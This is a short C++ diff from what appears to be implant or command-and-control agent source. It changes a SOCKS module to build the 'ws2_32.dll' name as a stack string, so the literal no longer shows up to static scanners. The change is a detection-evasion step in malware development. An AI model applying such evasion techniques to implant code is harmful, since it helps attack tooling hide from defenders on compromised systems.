@@ -2,6 +2,7 @@
 #include <socks.h>
 #include <package.h>
 #include <strings.h>
+#include <stackstr.h>
 
 #ifdef INCLUDE_CMD_SOCKS
 
@@ -12,8 +13,8 @@ static auto declfn resolve_ws2(
     _Inout_ instance& inst,
     _Out_   SocksState* state
 ) -> bool {
-    state->h_ws2 = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA(
-        symbol<LPCSTR>( "ws2_32.dll" ) ) );
+    STK_WS2_32(_n);
+    state->h_ws2 = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA( _n ) );
     if ( !state->h_ws2 ) return false;
 
     auto gpa = inst.kernel32.GetProcAddress;
